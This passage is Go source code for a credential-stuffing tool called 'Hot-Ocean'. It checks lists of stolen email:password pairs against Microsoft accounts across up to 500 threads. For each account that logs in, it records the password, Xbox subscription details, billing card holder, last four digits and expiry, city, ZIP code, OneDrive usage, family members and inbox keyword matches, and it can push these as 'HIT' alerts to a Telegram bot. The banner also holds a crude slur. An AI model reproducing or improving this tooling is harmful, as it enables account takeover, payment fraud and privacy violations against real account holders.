			c.dbgFail("PayToken empty — marking as FREE (No Token)")
			res.Xbox = &XboxData{IsFree: true, PremiumType: "FREE (No Token)", Gamertag: res.Name}
		}
		// Fallback country from payment APIs
		if res.Country == "" {
			if res.Xbox != nil && res.Xbox.Country != "" {
				res.Country = res.Xbox.Country
			} else if res.Billing != nil && res.Billing.Country != "" {
				res.Country = res.Billing.Country
			}
		}
		// Extended capture: OneDrive, Family
		res.OneDrive = c.fetchOneDrive(sess)
		res.Family   = c.fetchFamily(sess)
	}
	// ModeOneDrive: quick OneDrive storage check
	if c.Mode == ModeOneDrive {
		res.OneDrive = c.fetchOneDrive(sess)
	}
	// ModeAllInOne: everything
	if c.Mode == ModeAllInOne {
		payToken := c.getPaymentToken(sess)
		if payToken != "" {
			res.Billing  = c.fetchBilling(sess, payToken)
			res.Xbox     = c.fetchXbox(sess, payToken, res.Name)
		} else {
			res.Xbox = &XboxData{IsFree: true, PremiumType: "FREE (No Token)", Gamertag: res.Name}
		}
		if res.Country == "" {
			if res.Xbox != nil && res.Xbox.Country != ""   { res.Country = res.Xbox.Country }
			if res.Billing != nil && res.Billing.Country != "" { res.Country = res.Billing.Country }
		}
		res.Inbox     = c.fetchInboxCount(sess, email)
		res.Keywords  = c.fetchKeywords(sess)
		res.OneDrive  = c.fetchOneDrive(sess)
		res.Family    = c.fetchFamily(sess)
	}
	res.Status = "HIT"
	return res
}

// RESULT MANAGER  —  clean box-style file output
// ─────────────────────────────────────────────────────────────────────────────

const bW = 60 // inner width of file boxes

func bTop() string                { return "┌" + strings.Repeat("─", bW) + "┐\n" }
func bBot() string                { return "└" + strings.Repeat("─", bW) + "┘\n\n" }
func bSep() string                { return "├" + strings.Repeat("─", bW) + "┤\n" }
func bRow(label, value string) string {
	content := fmt.Sprintf("  %-14s %s", label+":", value)
	if len(content) > bW {
		content = content[:bW-1] + "…"
	}
	pad := bW - len(content)
	if pad < 0 {
		pad = 0
	}
	return "│" + content + strings.Repeat(" ", pad) + "│\n"
}
func bTitle(title string) string {
	pad := bW - len(title)
	if pad < 0 {
		pad = 0
	}
	left := pad / 2
	right := pad - left
	return "│" + strings.Repeat(" ", left) + title + strings.Repeat(" ", right) + "│\n"
}

type ResultManager struct {
	BaseDir        string
	Mode           int
	AllHits        string
	TwoFA          string
	XboxPremium    string
	XboxFree       string
	XboxExpired    string
	BillingHits    string
	FreeHits       string
	CountriesDir   string
	KeywordsDir    string
	OneDriveFile   string
	mu             sync.Mutex
	kwCounts       map[string]int
}

func NewResultManager(comboName, mode string, runMode int) *ResultManager {
	ts := time.Now().Format("20060102_150405")
	safeCombo := strings.NewReplacer(":", "_", "*", "_", "?", "_", "<", "_", ">", "_").Replace(comboName)
	base := filepath.Join("result", fmt.Sprintf("[%s] %s - %s", ts, safeCombo, mode))
	rm := &ResultManager{
		BaseDir:  base,
		Mode:     runMode,
		AllHits:  filepath.Join(base, "all_hits.txt"),
		TwoFA:    filepath.Join(base, "2fa.txt"),
		kwCounts: make(map[string]int),
	}
	os.MkdirAll(base, 0755)
	// Mode-specific dirs and files
	switch runMode {
	case ModeXboxOnly:
		rm.XboxPremium  = filepath.Join(base, "ms_sub_premium.txt")
		rm.XboxFree     = filepath.Join(base, "ms_sub_free.txt")
		rm.XboxExpired  = filepath.Join(base, "ms_sub_expired.txt")
		rm.BillingHits  = filepath.Join(base, "billing_cards.txt")
		rm.FreeHits     = filepath.Join(base, "free_hits.txt")
		rm.OneDriveFile = filepath.Join(base, "onedrive.txt")
		rm.CountriesDir = filepath.Join(base, "countries")
		os.MkdirAll(rm.CountriesDir, 0755)
	case ModeInboxerOnly:
		rm.CountriesDir = filepath.Join(base, "countries")
		rm.KeywordsDir = filepath.Join(base, "keywords")
		os.MkdirAll(rm.CountriesDir, 0755)
		os.MkdirAll(rm.KeywordsDir, 0755)
	case ModeCountry:
		rm.CountriesDir = filepath.Join(base, "countries")
		os.MkdirAll(rm.CountriesDir, 0755)
	case ModeOneDrive:
		rm.OneDriveFile = filepath.Join(base, "onedrive.txt")
	case ModeAllInOne:
		rm.XboxPremium   = filepath.Join(base, "ms_sub_premium.txt")
		rm.XboxFree      = filepath.Join(base, "ms_sub_free.txt")
		rm.XboxExpired   = filepath.Join(base, "ms_sub_expired.txt")
		rm.BillingHits   = filepath.Join(base, "billing_cards.txt")
		rm.FreeHits      = filepath.Join(base, "free_hits.txt")
		rm.OneDriveFile  = filepath.Join(base, "onedrive.txt")
		rm.CountriesDir  = filepath.Join(base, "countries")
		rm.KeywordsDir   = filepath.Join(base, "keywords")
		os.MkdirAll(rm.CountriesDir, 0755)
		os.MkdirAll(rm.KeywordsDir, 0755)
	// ModeBrute: only all_hits + 2fa
	}

	header := bTop() + bTitle("Hot-Ocean   •  @UP_OCEAN | @DENXPORTAL") + bSep() +
		bRow("Mode", mode) +
		bRow("Started", time.Now().Format("2006-01-02 15:04:05")) +
		bBot()
	os.WriteFile(rm.AllHits, []byte(header), 0644)
	return rm
}

func fAppend(path, text string) {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		f.WriteString(text)
		f.Close()
	}
}


func (rm *ResultManager) SaveHit(r CheckResult) {
	rm.mu.Lock()
	defer rm.mu.Unlock()

	cred := r.Email + ":" + r.Password

	// all_hits.txt — always
	fAppend(rm.AllHits, cred+"\n")

	// Effective country (best available source)
	effectiveCountry := r.Country
	if effectiveCountry == "" && r.Xbox != nil && r.Xbox.Country != "" {
		effectiveCountry = r.Xbox.Country
	}
	if effectiveCountry == "" && r.Billing != nil && r.Billing.Country != "" {
		effectiveCountry = r.Billing.Country
	}

	// countries/ — Xbox, Inboxer, Country modes
	if rm.CountriesDir != "" {
		if cc := strings.ToUpper(strings.TrimSpace(effectiveCountry)); len(cc) >= 2 {
			fn := countryFileName(cc)
			if fn != "" {
				fAppend(filepath.Join(rm.CountriesDir, fn), cred+"\n")
			}
		}
	}

	// ── XBOX MODE ONLY ────────────────────────────────────────────────────
	if rm.Mode == ModeXboxOnly || rm.Mode == ModeAllInOne {
		// free_hits.txt — no xbox and no billing
		if r.Xbox == nil && r.Billing == nil {
			fAppend(rm.FreeHits, cred+"\n")
		}

		// ms_sub_premium.txt / ms_sub_expired.txt — pipe format
		if r.Xbox != nil && !r.Xbox.IsFree {
			xd := r.Xbox
			parts := []string{cred}
			if effectiveCountry != "" { parts = append(parts, effectiveCountry) }
			if xd.Gamertag != "" { parts = append(parts, "GT:"+xd.Gamertag) }
			parts = append(parts, xd.PremiumType)
			if xd.DaysLeft != "" {
				parts = append(parts, xd.DaysLeft+" days")
			}
			if xd.RenewalDate != "" { parts = append(parts, "RENEWS:"+xd.RenewalDate) }
			if xd.AutoRenew != "" { parts = append(parts, "AUTO:"+xd.AutoRenew) }
			if xd.TotalAmount != "" && xd.Currency != "" { parts = append(parts, "PRICE:"+xd.TotalAmount+" "+xd.Currency) }
			if xd.Balance != "" { parts = append(parts, "BAL:"+xd.Balance) }
			if xd.CardHolder != "" { parts = append(parts, "CARD:"+xd.CardHolder) }
			if xd.RewardsPoints != "" { parts = append(parts, "PTS:"+xd.RewardsPoints) }
			line := strings.Join(parts, " │ ")+"\n"
			if xd.IsExpired {
				fAppend(rm.XboxExpired, line)
			} else {
				fAppend(rm.XboxPremium, line)
			}
		}

		// ms_sub_free.txt
		if r.Xbox != nil && r.Xbox.IsFree {
			xd := r.Xbox
			parts := []string{cred}
			if effectiveCountry != "" { parts = append(parts, effectiveCountry) }
			if xd.Balance != "" { parts = append(parts, "BAL:"+xd.Balance) }
			if xd.CardHolder != "" { parts = append(parts, "CARD:"+xd.CardHolder) }
			if xd.RewardsPoints != "" { parts = append(parts, "PTS:"+xd.RewardsPoints) }
			fAppend(rm.XboxFree, strings.Join(parts, " │ ")+"\n")
		}

		// billing_cards.txt — pipe format
		if r.Billing != nil {
			bd := r.Billing
			parts := []string{cred}
			if effectiveCountry != "" { parts = append(parts, effectiveCountry) }
			if bd.CardHolder != "" { parts = append(parts, "HOLDER:"+bd.CardHolder) }
			cardLine := bd.CardType
			if bd.Last4 != "" { cardLine += " *"+bd.Last4 }
			if bd.ExpiryMonth != "" { cardLine += " exp:"+bd.ExpiryMonth+"/"+bd.ExpiryYear }
			parts = append(parts, "CARD:"+cardLine)
			if bd.Balance != "" { parts = append(parts, "BAL:"+bd.Balance) }
			if bd.City != "" { parts = append(parts, "CITY:"+bd.City) }
			if bd.Zipcode != "" { parts = append(parts, "ZIP:"+bd.Zipcode) }
			if bd.RewardsPoints != "" { parts = append(parts, "PTS:"+bd.RewardsPoints) }
			fAppend(rm.BillingHits, strings.Join(parts, " │ ")+"\n")
		}
	}


	// ── ONEDRIVE: her zaman rm.OneDriveFile varsa kaydet ────────────────
	if r.OneDrive != nil && rm.OneDriveFile != "" {
		oneDriveLine := cred + " │ " + r.OneDrive.Used + " / " + r.OneDrive.Total + " (" + r.OneDrive.Pct + ") │ Free: " + r.OneDrive.Remaining
		fAppend(rm.OneDriveFile, oneDriveLine+"\n")
	}

	// ── FAMILY: Xbox + AllInOne ────────────────────────────────────────────
	if (rm.Mode == ModeXboxOnly || rm.Mode == ModeAllInOne) && r.Family != nil && r.Family.MemberCount > 0 {
		org := ""
		if r.Family.IsFamilyOrganizer { org = " [ORGANIZER]" }
		famLine := cred + " │ FAMILY " + strconv.Itoa(r.Family.MemberCount) + " members" + org + " │ " + strings.Join(r.Family.Members, ", ")
		fAppend(filepath.Join(rm.BaseDir, "family_hits.txt"), famLine+"\n")
	}
	if (rm.Mode == ModeInboxerOnly || rm.Mode == ModeAllInOne) && rm.KeywordsDir != "" {
		for kw, ki := range r.Keywords {
			rm.kwCounts[kw]++
			safe := strings.NewReplacer("/", "_", "\\", "_", ":", "_", "*", "_", "?", "_", "<", "_", ">", "_", "|", "_").Replace(kw)
			date := time.Now().Format("02.01")
			fn := fmt.Sprintf("%s (%d hits) - (%s).txt", safe, rm.kwCounts[kw], date)
			if rm.kwCounts[kw] > 1 {
				prevFn := fmt.Sprintf("%s (%d hits) - (%s).txt", safe, rm.kwCounts[kw]-1, date)
				os.Rename(filepath.Join(rm.KeywordsDir, prevFn), filepath.Join(rm.KeywordsDir, fn))
			}
			kf := filepath.Join(rm.KeywordsDir, fn)
			count := fmt.Sprintf("%.0f", ki.Count)
			subj := ki.Subject
			if subj == "" { subj = "-" }
			country := strings.ToUpper(strings.TrimSpace(effectiveCountry))
			if country == "" { country = "N/A" }
			if len(subj) > 55 { subj = subj[:55] + "…" }
			sender := ki.Sender
			if len(sender) > 35 { sender = sender[:35] + "…" }
			var lineParts []string
			lineParts = append(lineParts, cred)
			lineParts = append(lineParts, fmt.Sprintf("%-4s", country))
			lineParts = append(lineParts, count+" MSG")
			lineParts = append(lineParts, subj)
			fAppend(kf, strings.Join(lineParts, " │ ")+"\n")
		}
	}
}

func (rm *ResultManager) Save2FA(email, pass string) {
	rm.mu.Lock()
	defer rm.mu.Unlock()
	fAppend(rm.TwoFA, email+":"+pass+"\n")
}

// ─────────────────────────────────────────────────────────────────────────────
// LIVE STATS
// ─────────────────────────────────────────────────────────────────────────────

type Stats struct {
	Total        int
	Checked      int
	Hits         int
	TwoFA        int
	Bads         int
	Errors       int
	XboxPremium  int
	XboxFree     int
	WithBilling  int
	Start        time.Time
	CountryStats map[string]int
	KeywordStats map[string]int
	mu           sync.Mutex
}

func NewStats(total int) *Stats {
	return &Stats{Total: total, Start: time.Now(),
		CountryStats: make(map[string]int), KeywordStats: make(map[string]int)}
}

func (s *Stats) Update(r CheckResult) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.Checked++
	switch r.Status {
	case "HIT":
		s.Hits++
		if r.Country != "" {
			s.CountryStats[r.Country]++
		}
		for kw := range r.Keywords {
			s.KeywordStats[kw]++
		}
		if r.Xbox != nil {
			if r.Xbox.IsFree {
				s.XboxFree++
			} else {
				s.XboxPremium++
			}
		}
		if r.Billing != nil {
			s.WithBilling++
		}
	case "2FA":
		s.TwoFA++
	case "BAD", "BANNED":
		s.Bads++
	default:
		s.Errors++
	}
}

func (s *Stats) Print() {
	s.mu.Lock()
	defer s.mu.Unlock()
	elapsed := time.Since(s.Start).Seconds()
	prog := float64(0)
	if s.Total > 0 {
		prog = float64(s.Checked) / float64(s.Total) * 100
	}
	cpm := float64(0)
	if elapsed > 0 {
		cpm = float64(s.Checked) / elapsed * 60
	}
	et := time.Unix(int64(elapsed), 0).UTC().Format("15:04:05")
	fmt.Printf("\r%s[%d/%d]%s %s✅%d%s|%s🔐%d%s|%s❌%d%s|%s⚠%d%s|%s🎮P:%d%s|%s🆓%d%s|%s💳%d%s|%s%.1f%%%s|%s%.0fCPM%s|%s%s%s  ",
		cCyn, s.Checked, s.Total, cRst,
		cGrn, s.Hits, cRst,
		cYel, s.TwoFA, cRst,
		cRed, s.Bads, cRst,
		cMag, s.Errors, cRst,
		cBlu, s.XboxPremium, cRst,
		cGrn, s.XboxFree, cRst,
		cWht, s.WithBilling, cRst,
		cCyn, prog, cRst,
		cGrn, cpm, cRst,
		cYel, et, cRst,
	)
}

// ─────────────────────────────────────────────────────────────────────────────
// TERMINAL HIT DISPLAY
// ─────────────────────────────────────────────────────────────────────────────

func printHit(r CheckResult, lock *sync.Mutex) {
	lock.Lock()
	defer lock.Unlock()
	W := 58
	row := func(label, val, col string) {
		s := fmt.Sprintf("  %-12s %s", label+":", val)
		if len(s) > W {
			s = s[:W-1] + "…"
		}
		fmt.Printf("%s│%s %s%-*s%s %s│%s\n", cGrn, cRst, col, W-1, s, cRst, cGrn, cRst)
	}
	sep := func(title, col string) {
		t := "  ── " + title + " "
		pad := W - len(t)
		fmt.Printf("%s├%s%s%s%s%s┤%s\n", cGrn, col, cBold, t, strings.Repeat("─", pad), cRst, cRst)
	}
	fmt.Printf("\n%s┌%s┐%s\n", cGrn, strings.Repeat("─", W), cRst)
	fmt.Printf("%s│%s%s  ✅  HIT%s%-*s%s│%s\n", cGrn, cRst, cBold+cGrn, cRst, W-10, "", cGrn, cRst)
	fmt.Printf("%s├%s┤%s\n", cGrn, strings.Repeat("─", W), cRst)
	row("EMAIL", r.Email, cWht)
	row("PASS", r.Password, cWht)
	if r.Name != "" {
		row("NAME", r.Name, cCyn)
	}
	if r.Country != "" {
		row("COUNTRY", r.Country, cCyn)
	}
	if r.Inbox != "" && r.Inbox != "0" {
		row("INBOX", r.Inbox+" messages", cBlu)
	}
	if len(r.Keywords) > 0 {
		sep("Keywords", cYel)
		for kw, ki := range r.Keywords {
			row(kw, fmt.Sprintf("%.0f emails", ki.Count), cYel)
			if ki.Subject != "" {
				s := ki.Subject
				if len(s) > 42 {
					s = s[:42] + "…"
				}
				row("  subject", s, cWht)
			}
			if ki.Sender != "" {
				s := ki.Sender
				if len(s) > 42 {
					s = s[:42] + "…"
				}
				row("  from", s, cCyn)
			}
		}
	}
	if r.Xbox != nil {
		if r.Xbox.IsFree {
			sep("Microsoft Subscription FREE", cGrn)
			if r.Xbox.Gamertag != "" {
				row("GAMERTAG", r.Xbox.Gamertag, cCyn)
			}
			row("STATUS", "FREE (No Subscription)", cYel)
			if r.Xbox.Balance != "" {
				row("BALANCE", r.Xbox.Balance, cGrn)
			}
			if r.Xbox.CardHolder != "" {
				row("CARD HOLDER", r.Xbox.CardHolder, cCyn)
			}
			if r.Xbox.RewardsPoints != "" {
				row("REWARDS PTS", r.Xbox.RewardsPoints, cYel)
			}
		} else {
			header := "Microsoft Subscription"
			headerCol := cBlu
			if r.Xbox.IsExpired {
				header = "Microsoft Subscription EXPIRED"
				headerCol = cRed
			}
			sep(header, headerCol)
			if r.Xbox.Gamertag != "" {
				row("GAMERTAG", r.Xbox.Gamertag, cCyn)
			}
			row("PLAN", r.Xbox.PremiumType, cMag)
			if r.Xbox.DaysLeft != "" {
				dayLabel := "DAYS LEFT"
				if r.Xbox.IsExpired { dayLabel = "EXPIRED" }
				row(dayLabel, r.Xbox.DaysLeft+" days", cRed)
			}
			if r.Xbox.AutoRenew != "" {
				row("AUTO RENEW", r.Xbox.AutoRenew, cWht)
			}
			if r.Xbox.EAPlay {
				row("EA PLAY", "YES", cGrn)
			}
			if r.Xbox.Balance != "" {
				row("BALANCE", r.Xbox.Balance, cGrn)
			}
			if r.Xbox.RewardsPoints != "" {
				row("REWARDS PTS", r.Xbox.RewardsPoints, cYel)
			}
		}
	}
	if r.Billing != nil {
		sep("Billing", cYel)
		if r.Billing.CardHolder != "" {
			row("HOLDER", r.Billing.CardHolder, cCyn)
		}
		card := r.Billing.CardType + "  *" + r.Billing.Last4
		if r.Billing.ExpiryMonth != "" {
			card += "  exp " + r.Billing.ExpiryMonth + "/" + r.Billing.ExpiryYear
		}
		row("CARD", card, cWht)
		if r.Billing.Balance != "" {
			row("BALANCE", r.Billing.Balance, cGrn)
		}
		if r.Billing.RewardsPoints != "" {
			row("REWARDS", r.Billing.RewardsPoints+" pts", cYel)
		}
	}
	if r.OneDrive != nil {
		sep("OneDrive Storage", cCyn)
		row("USED", r.OneDrive.Used+" / "+r.OneDrive.Total, cBlu)
		row("FREE", r.OneDrive.Remaining, cGrn)
		row("USAGE", r.OneDrive.Pct, cYel)
	}
	if r.Family != nil && r.Family.MemberCount > 0 {
		sep("Microsoft Family", cYel)
		org := "NO"
		if r.Family.IsFamilyOrganizer { org = "YES" }
		row("ORGANIZER", org, cGrn)
		row("MEMBERS", strconv.Itoa(r.Family.MemberCount), cCyn)
		for i, m := range r.Family.Members {
			if i >= 5 { break }
			row(fmt.Sprintf("  [%d]", i+1), m, cWht)
		}
	}
	fmt.Printf("%s└%s┘%s\n", cGrn, strings.Repeat("─", W), cRst)
}

// ─────────────────────────────────────────────────────────────────────────────
// FINAL DASHBOARD
// ─────────────────────────────────────────────────────────────────────────────

func printFinal(s *Stats, rm *ResultManager) {
	s.mu.Lock()
	defer s.mu.Unlock()
	elapsed := time.Since(s.Start).Seconds()
	cpm := float64(0)
	if elapsed > 0 {
		cpm = float64(s.Checked) / elapsed * 60
	}
	et := time.Unix(int64(elapsed), 0).UTC().Format("15:04:05")
	W := 62
	row := func(label, val, col string) {
		fmt.Printf("%s│%s  %-20s %s%-37s%s %s│%s\n", cCyn, cRst, label, col, val, cRst, cCyn, cRst)
	}
	hdr := func(title, col string) {
		fmt.Printf("%s├%s┤%s\n", cCyn, strings.Repeat("─", W), cRst)
		pad := W - len(title)
		fmt.Printf("%s│%s%s%s%s%s│%s\n", cCyn, cRst, col+cBold,
			strings.Repeat(" ", pad/2)+title+strings.Repeat(" ", pad-pad/2), cRst, cCyn, cRst)
	}
	fmt.Printf("\n\n%s┌%s┐%s\n", cCyn, strings.Repeat("─", W), cRst)
	fmt.Printf("%s│%s%s%s  📊  FINAL RESULTS  %s%*s%s│%s\n",
		cCyn, cRst, cBold, cMag, cRst, W-22, "", cCyn, cRst)
	fmt.Printf("%s├%s┤%s\n", cCyn, strings.Repeat("─", W), cRst)
	row("✅  Hits", strconv.Itoa(s.Hits), cGrn)
	row("🔐  2FA", strconv.Itoa(s.TwoFA), cYel)
	row("❌  Bad", strconv.Itoa(s.Bads), cRed)
	row("⚠️   Errors", strconv.Itoa(s.Errors), cMag)
	row("🎮  MS Subscription", strconv.Itoa(s.XboxPremium), cBlu)
	row("🆓  MS Sub Free", strconv.Itoa(s.XboxFree), cGrn)
	row("💳  With Billing", strconv.Itoa(s.WithBilling), cWht)
	row("📋  Total", fmt.Sprintf("%d / %d", s.Checked, s.Total), cCyn)
	row("⚡  CPM", fmt.Sprintf("%.0f", cpm), cGrn)
	row("⏱   Elapsed", et, cCyn)
	if len(s.CountryStats) > 0 {
		hdr("🌍  TOP COUNTRIES", cGrn)
		fmt.Printf("%s├%s┤%s\n", cCyn, strings.Repeat("─", W), cRst)
		type kv struct{ K string; V int }
		var ss []kv
		for k, v := range s.CountryStats {
			ss = append(ss, kv{k, v})
		}
		sort.Slice(ss, func(i, j int) bool { return ss[i].V > ss[j].V })
		for i, kv := range ss {
			if i >= 6 {
				break
			}
			pct := float64(0)
			if s.Hits > 0 {
				pct = float64(kv.V) / float64(s.Hits) * 100
			}
			barLen := int(pct / 4)
			bar := strings.Repeat("█", barLen) + strings.Repeat("░", 25-barLen)
			row(kv.K, fmt.Sprintf("%s  %3d  %.1f%%", bar, kv.V, pct), cGrn)
		}
	}
	if len(s.KeywordStats) > 0 {
		hdr("🎯  KEYWORD STATS", cYel)
		fmt.Printf("%s├%s┤%s\n", cCyn, strings.Repeat("─", W), cRst)
		type kv struct{ K string; V int }
		var ss []kv
		for k, v := range s.KeywordStats {
			ss = append(ss, kv{k, v})
		}
		sort.Slice(ss, func(i, j int) bool { return ss[i].V > ss[j].V })
		for _, kv := range ss {
			pct := float64(0)
			if s.Hits > 0 {
				pct = float64(kv.V) / float64(s.Hits) * 100
			}
			row(kv.K, fmt.Sprintf("%4d hits  (%.1f%%)", kv.V, pct), cYel)
		}
	}
	fmt.Printf("%s├%s┤%s\n", cCyn, strings.Repeat("─", W), cRst)
	row("📂  Output", rm.BaseDir[:intMin(len(rm.BaseDir), 37)], cGrn)
	fmt.Printf("%s└%s┘%s\n", cCyn, strings.Repeat("─", W), cRst)
}

// ─────────────────────────────────────────────────────────────────────────────
// UI HELPERS
// ─────────────────────────────────────────────────────────────────────────────

func inp(prompt string) string {
	fmt.Print(prompt)
	r := bufio.NewReader(os.Stdin)
	t, _ := r.ReadString('\n')
	return strings.TrimSpace(t)
}

func openBrowser(u string) {
	switch runtime.GOOS {
	case "linux":
		exec.Command("xdg-open", u).Start()
	case "windows":
		exec.Command("rundll32", "url.dll,FileProtocolHandler", u).Start()
	case "darwin":
		exec.Command("open", u).Start()
	}
}

func modeName(m int) string {
	switch m {
	case ModeXboxOnly:
		return "Microsoft Subscription"
	case ModeInboxerOnly:
		return "Inboxer Only"
	case ModeBrute:
		return "Brute"
	case ModeCountry:
		return "Country Target"
	case ModeOneDrive:
		return "OneDrive Check"
	case ModeAllInOne:
		return "All-In-One"
	}
	return "Unknown"
}

func printBanner() {
	W := 64
	center := func(s, col string) {
		pad := W - 2 - len(s)
		if pad < 0 {
			pad = 0
		}
		left := pad / 2
		right := pad - left
		fmt.Printf("%s║%s%s%s%s%s║%s\n", cCyn, cRst, col,
			strings.Repeat(" ", left)+s+strings.Repeat(" ", right), cRst, cCyn, cRst)
	}
	fmt.Printf("%s%s╔%s╗%s\n", cBold, cCyn, strings.Repeat("═", W-2), cRst)
	center("HOT-OCEAN ⚡ BEST RAPER HOTMAİL", cRed+cBold)
	center("Xbox · OneDrive · Inboxer · Country · All-In-One", cYel)
	center("@UP_OCEAN  |  @DENXPORTAL  |  @TheRealDenx", cMag)
	fmt.Printf("%s%s╚%s╝%s\n\n", cBold, cCyn, strings.Repeat("═", W-2), cRst)
}

// ─────────────────────────────────────────────────────────────────────────────
// MAIN
// ─────────────────────────────────────────────────────────────────────────────

func main_old() {
	openBrowser("https://t.me/DenxPortal")
	printBanner()

	// ── Telegram Bot Setup ────────────────────────────────────────────────
	fmt.Printf("%s┌─ Telegram Notifications%s\n", cCyn, cRst)
	fmt.Printf("%s│  Enter Bot Token + Chat ID to get instant HIT alerts%s\n", cWht, cRst)
	fmt.Printf("%s│  Leave blank to skip%s\n", cWht, cRst)
	fmt.Printf("%s└─%s\n\n", cCyn, cRst)
	tgBotToken = inp(fmt.Sprintf("%sBot Token (blank=skip): %s", cGrn, cRst))
	if tgBotToken != "" {
		tgChatID = inp(fmt.Sprintf("%sChat ID               : %s", cGrn, cRst))
		if tgChatID != "" {
			// Test the bot
			testMsg := "✅ <b>Hot-Ocean connected!</b>\nWatching for HITs..."
			tgEnabled = true
			tgSend(testMsg)
			time.Sleep(300 * time.Millisecond) // let goroutine fire
			fmt.Printf("%s✓  Telegram enabled — test message sent%s\n\n", cGrn, cRst)
		} else {
			fmt.Printf("%s⚠  No Chat ID — Telegram disabled%s\n\n", cYel, cRst)
		}
	} else {
		fmt.Printf("%s⚠  Telegram disabled%s\n\n", cYel, cRst)
	}

	// ── Run Mode ──────────────────────────────────────────────────────────
	fmt.Printf("%s┌─ Select Mode%s\n", cCyn, cRst)
	fmt.Printf("%s│  [1] Microsoft Sub  %s─ Xbox + Billing + Subscription%s\n", cWht, cGrn, cRst)
	fmt.Printf("%s│  [2] Inboxer Only   %s─ Keyword scan + Subject + Sender%s\n", cWht, cYel, cRst)
	fmt.Printf("%s│  [3] Brute          %s─ Validate only (fastest, no capture)%s\n", cWht, cRed, cRst)
	fmt.Printf("%s│  [4] Country Target %s─ Login + country detect only (fast)%s\n", cWht, cMag, cRst)
	fmt.Printf("%s│  [5] OneDrive Check %s─ Storage usage capture%s\n", cWht, cBlu, cRst)
	fmt.Printf("%s│  [6] All-In-One  %s─ Xbox+Billing+Inbox+OneDrive+Family%s\n", cWht, cMag+cBold, cRst)

	modeIn := inp(fmt.Sprintf("%sMode [1-6] (default 1): %s", cGrn, cRst))
	runMode, err := strconv.Atoi(modeIn)
	if err != nil || runMode < 1 || runMode > 6 {
		runMode = ModeXboxOnly
		fmt.Printf("%s⚠  Defaulting to MS Subscription%s\n\n", cYel, cRst)
	} else {
		fmt.Printf("%s✓  Mode: %s%s\n\n", cGrn, modeName(runMode), cRst)
	}

	// ── Keywords ─────────────────────────────────────────────────────────
	var keywords []string
	if runMode == ModeInboxerOnly || runMode == ModeAllInOne {
		fmt.Printf("%s┌─ Keywords%s\n", cCyn, cRst)
		fmt.Printf("%s│  [1] Type manually   [2] Load .txt file   [0] Skip%s\n", cWht, cRst)
		fmt.Printf("%s└─%s\n\n", cCyn, cRst)
		switch inp(fmt.Sprintf("%sKeyword input [0-2]: %s", cGrn, cRst)) {
		case "1":
			fmt.Println("  Enter keywords, empty line to finish:")
			for {
				kw := inp(fmt.Sprintf("  %s[%d]: %s", cGrn, len(keywords)+1, cRst))
				if kw == "" {
					break
				}
				keywords = append(keywords, kw)
			}
		case "2":
			kp := inp(fmt.Sprintf("%sFile path: %s", cGrn, cRst))
			data, err := os.ReadFile(kp)
			if err != nil {
				fmt.Printf("%s❌ File not found%s\n", cRed, cRst)
			} else {
				for _, l := range strings.Split(string(data), "\n") {
					if kw := strings.TrimSpace(l); kw != "" {
						keywords = append(keywords, kw)
					}
				}
				fmt.Printf("%s✓  %d keywords loaded%s\n", cGrn, len(keywords), cRst)
			}
		default:
			fmt.Printf("%s⚠  No keywords — inbox count only%s\n", cYel, cRst)
		}
		fmt.Println()
	}

	// ── Scan Mode ─────────────────────────────────────────────────────────
	fmt.Printf("%s┌─ Scan Mode%s\n", cCyn, cRst)
	fmt.Printf("%s│  [1] Single test     [2] Serial (safe)     [3] Custom threads%s\n", cWht, cRst)
	fmt.Printf("%s└─%s\n\n", cCyn, cRst)

	scanMode := inp(fmt.Sprintf("%sScan mode [1-3]: %s", cGrn, cRst))
	debugIn := strings.ToLower(inp(fmt.Sprintf("%sDebug? [y/n]: %s", cYel, cRst)))
	debug := debugIn == "y"

	// ── Single ────────────────────────────────────────────────────────────
	if scanMode == "1" {
		fmt.Println()
		email := inp(fmt.Sprintf("%sEmail   : %s", cGrn, cRst))
		pass := inp(fmt.Sprintf("%sPassword: %s", cGrn, cRst))
		fmt.Printf("\n%s⏳ Checking...%s\n", cYel, cRst)
		chk := NewChecker(keywords, debug, runMode)
		r := chk.Check(email, pass)
		lk := &sync.Mutex{}
		switch r.Status {
		case "HIT":
			printHit(r, lk)
			tgSend(tgBuildHitMsg(r))
		case "2FA":
			fmt.Printf("\n%s🔐 2FA/LOCKED: %s  (valid credentials)%s\n", cYel, email, cRst)
		case "BANNED":
			fmt.Printf("\n%s🚫 BANNED: %s%s\n", cRed, email, cRst)
		default:
			fmt.Printf("\n%s❌ %s: %s%s\n", cRed, r.Status, email, cRst)
		}
		return
	}

	// ── Bulk ──────────────────────────────────────────────────────────────
	threads := 1
	if scanMode == "3" {
		for {
			ts := inp(fmt.Sprintf("%sThreads (1-500): %s", cGrn, cRst))
			t, e := strconv.Atoi(ts)
			if e == nil && t >= 1 && t <= 500 {
				threads = t
				break
			}
			fmt.Printf("%s❌ Enter 1–500%s\n", cRed, cRst)
		}
	}

	filePath := inp(fmt.Sprintf("\n%sCombo file: %s", cGrn, cRst))
	content, e2 := os.ReadFile(filePath)
	if e2 != nil {
		fmt.Printf("%s❌ File not found: %s%s\n", cRed, filePath, cRst)
		return
	}
	var combos []string
	for _, line := range strings.Split(string(content), "\n") {
		if line = strings.TrimSpace(line); strings.Contains(line, ":") {
			combos = append(combos, line)
		}
	}
	if len(combos) == 0 {
		fmt.Printf("%s❌ No valid combos found%s\n", cRed, cRst)
		return
	}

	comboBase := strings.TrimSuffix(filepath.Base(filePath), filepath.Ext(filePath))
	rm := NewResultManager(comboBase, modeName(runMode), runMode)
	stats := NewStats(len(combos))
	printLock := &sync.Mutex{}

	fmt.Printf("\n%s┌%s┐%s\n", cCyn, strings.Repeat("─", 60), cRst)
	fmt.Printf("%s│  📋 Combos    : %-43d│%s\n", cCyn, len(combos), cRst)
	fmt.Printf("%s│  ⚙️  Mode      : %-43s│%s\n", cCyn, modeName(runMode), cRst)
	fmt.Printf("%s│  🔧 Threads   : %-43d│%s\n", cCyn, threads, cRst)
	fmt.Printf("%s│  🔑 Keywords  : %-43d│%s\n", cCyn, len(keywords), cRst)
	tgStatus := "OFF"
	if tgEnabled { tgStatus = "ON ✓" }
	fmt.Printf("%s│  📨 Telegram  : %-43s│%s\n", cCyn, tgStatus, cRst)
	outDir := rm.BaseDir
	if len(outDir) > 43 {
		outDir = "..." + outDir[len(outDir)-40:]
	}
	fmt.Printf("%s│  📂 Output    : %-43s│%s\n", cCyn, outDir, cRst)
